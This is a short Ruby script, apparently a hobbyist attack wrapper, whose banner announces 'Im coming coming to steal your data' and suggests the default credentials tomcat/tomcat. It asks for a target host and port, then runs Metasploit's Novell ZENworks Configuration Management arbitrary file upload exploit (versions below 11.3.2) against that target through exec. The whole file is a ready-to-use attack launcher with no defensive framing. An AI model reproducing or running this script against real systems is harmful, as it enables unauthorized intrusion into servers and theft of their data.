require 'colorize'
puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...
  

   1st Try {set USERNAME tomcat; set PASSWORD tomcat}

  Novell ZENworks Configuration Management Arbitrary File Upload

		  Novell ZCM < v11.3.2 - Universal Java
""".white

puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? [Default is 443] ".blue
print " [!] ---> ".yellow
port = gets.chomp




exec("msfconsole -x 'use exploit/multi/http/zenworks_configuration_management_upload' -x 'setg RHOST #{target}'  -x 'setg RPORT #{port}' -x 'run'")

